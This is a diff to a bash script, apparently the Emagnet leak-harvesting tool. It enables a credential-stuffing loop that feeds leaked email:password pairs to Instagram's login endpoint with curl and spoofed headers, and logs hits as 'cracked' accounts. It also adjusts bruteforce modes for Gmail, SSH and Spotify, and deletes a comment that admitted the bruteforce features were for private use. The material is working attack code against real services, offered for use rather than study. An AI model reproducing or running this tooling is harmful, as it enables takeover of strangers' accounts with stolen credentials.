@@ -42,10 +42,6 @@
 #### Emagnet has been created for a legal puprose, wich is for count stats ####
 #### for leaked email addresses and passwords.                             ####
 ####                                                                       ####
-#### The BruteForce methods has been added for private usage only          ####
-#### Mmy memory is like an gold fish and I have alot of different          ####
-#### logins on the web sites emagnet has brute force support for           ####
-####                                                                       ####
 ###############################################################################
 ###############################################################################
 
@@ -538,6 +534,7 @@ if [[ "$GBRUTEFORCE" = "true" ]]; then
             printf "\n%64s \n\n" | tr ' ' '='
             emagnet_analyzer
 	  else
+            emagnet_conf
             sed -i '125d' "$CONF"
             sed -i '125 i GBRUTEFORCE=false' "$CONF"
             sed -i '126d' "$CONF"
@@ -626,17 +623,16 @@ AJAX="X-Instagram-AJAX: 4a1f95f94afb' -H 'X-IG-App-ID: 936619743392459"
     |cut -d':' -f2,3 \
     |cut -d'|' -f1 \
     |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> $HOME/.config/emagnet/tmp/.emagnet-instagram-accounts.txt
-bash m
 
-#while read instagramlogin; do
-#INSTAGRAM_USER="$(echo $instagramlogin|sed 's/:/\&password\=/g')"
-#INSTAGRAM_PASS="$(echo $instagramlogin|cut -d':' -f2)"
+while read instagramlogin; do
+INSTAGRAM_USER="$(echo $instagramlogin|sed 's/:/\&password\=/g')"
+INSTAGRAM_PASS="$(echo $instagramlogin|cut -d':' -f2)"
 
-# curl -s "${URL}" -H "${USERAGENT}" -H '$ACCEPT' -H "$ACCEPTLANG" --compressed -H "$XCSFRTOKEN" -H "$AJAX" -H 'X-IG-WWW-Claim: 0' -H \
-#'Content-Type: application/x-www-form-urlencoded' -H 'X-Requested-With: XMLHttpRequest' -H \
-#'Connection: keep-alive' -H 'Referer: https://www.instagram.com/accounts/login/?source=auth_switcher' -H \
-#'Cookie: rur=VLL; csrftoken=dBKbmgDvsJDSVpnMlnX3p7rNViGv0Cps; mid=XWyxNwAEAAHy5kJG_MPLMsE7Uzzs' -H 'DNT: 1' -H 'TE: Trailers' --data \
-#"username=$USERNAME"|grep -q 'checkpoint\|authenticated": true'
+ curl -s "${URL}" -H "${USERAGENT}" -H '$ACCEPT' -H "$ACCEPTLANG" --compressed -H "$XCSFRTOKEN" -H "$AJAX" -H 'X-IG-WWW-Claim: 0' -H \
+'Content-Type: application/x-www-form-urlencoded' -H 'X-Requested-With: XMLHttpRequest' -H \
+'Connection: keep-alive' -H 'Referer: https://www.instagram.com/accounts/login/?source=auth_switcher' -H \
+'Cookie: rur=VLL; csrftoken=dBKbmgDvsJDSVpnMlnX3p7rNViGv0Cps; mid=XWyxNwAEAAHy5kJG_MPLMsE7Uzzs' -H 'DNT: 1' -H 'TE: Trailers' --data \
+"username=$USERNAME"|grep -q 'checkpoint\|authenticated": true'
 if [[ $? -eq "0" ]]; then
          echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${INSTAGRAM_USER}:${INSTAGRAM_PASS}"
          echo -e "================================================================"             >>    "$EMAGNETLOGS/cracked-instagram-passwords.txt"
@@ -653,7 +649,7 @@ if [[ $? -eq "0" ]]; then
 else
          echo -e "[\e[1;31m<<\e[0m] - Wrong Password: $instagramlogin"
 fi
-#   done < $HOME/.config/emagnet/tmp/.emagnet-instagram-accounts.txt
+   done < $HOME/.config/emagnet/tmp/.emagnet-instagram-accounts.txt
          printf "%64s \n" | tr ' ' '='
          echo -e "Done! Successfully cracked $SUCCEED accounts and $FAILED failed.. \n"
          sleep 3
@@ -993,12 +989,16 @@ case "${1}" in
 		  ;;
 
       "-g"|"-bruteforce"|"--bruteforce")
+          sed -i 's/GBRUTEFORCE=true/GBRUTEFORCE=false/g' "$CONF"
+          sed -i 's/SBRUTEFORCE=true/SBRUTEFORCE=false/g' "$CONF"
+          sed -i 's/PBRUTEFORCE=true/PBRUTEFORCE=false/g' "$CONF"
+          sed -i 's/IBRUTEFORCE=true/IBRUTEFORCE=false/g' "$CONF"
           emagnet_iconnection
           emagnet_first_run
-           if [[ "$2" = "gmail" ]]; then
 
-               sed -i 's/GBRUTEFORCE=false/GBRUTEFORCE=true/g' "$CONF"
-               emagnet_conf
+           if [[ "$2" = "gmail" ]]; then
+            sed -i 's/GBRUTEFORCE=false/GBRUTEFORCE=true/g' "$CONF"
+            emagnet_conf
               if [[ "$GBRUTEFORCE" = "true" ]]; then
                emagnet_run4ever
                emagnet_gmail_bruter
@@ -1006,15 +1006,16 @@ case "${1}" in
               fi
 
            elif [[ "$2" = "ssh" ]]; then
-               sed -i 's/SBRUTEFORCE=false/SBRUTEFORCE=true/g' "$CONF"
-               emagnet_conf
+           sed -i 's/SBRUTEFORCE=false/SBRUTEFORCE=true/g' "$CONF"
+           emagnet_conf
               if [[ "$SBRUTEFORCE" = "true" ]]; then
                emagnet_run4ever
                emagnet_sshbruter
                mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
               fi
+
            elif [[ "$2" = "instagram" ]]; then
-               sed -i 's/IBRUTEFORCE=false/IBRUTEFORCE=true/g' "$CONF"
+           sed -i 's/IBRUTEFORCE=false/IBRUTEFORCE=true/g' "$CONF"
                emagnet_conf
               if [[ "$IBRUTEFORCE" = "true" ]]; then
                emagnet_run4ever
@@ -1022,8 +1023,8 @@ case "${1}" in
                mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
               fi
            elif [[ "$2" = "spotify" ]]; then
-              emagnet_conf # We need to use conf here since we edited the PBRUTER in the function so we must source it again
-              find /usr/include -type d |grep 'libspotify' &> /dev/null
+               emagnet_conf
+               find /usr/include -type d |grep 'libspotify' &> /dev/null
              if [[ "$?" -ne "0" ]]; then
              if [[ -z "$LIBSPOTIFY" ]]; then
 	       printf "Libspotify is deprecated but is required for emagnet bruteforcing\nto work, do you have libspotify installed? (YES/no): "
@@ -1060,8 +1061,8 @@ case "${1}" in
                               exit 1
                             fi
                         fi
-                    sed -i 's/PBRUTEFORCE=false/PBRUTEFORCE=true/g' "$CONF"
-                    emagnet_conf
+                     sed -i 's/PBRUTEFORCE=false/PBRUTEFORCE=true/g' "$CONF"
+                  emagnet_conf
 
                  if [[ "$PBRUTEFORCE" = "true" ]]; then
                                 emagnet_clear
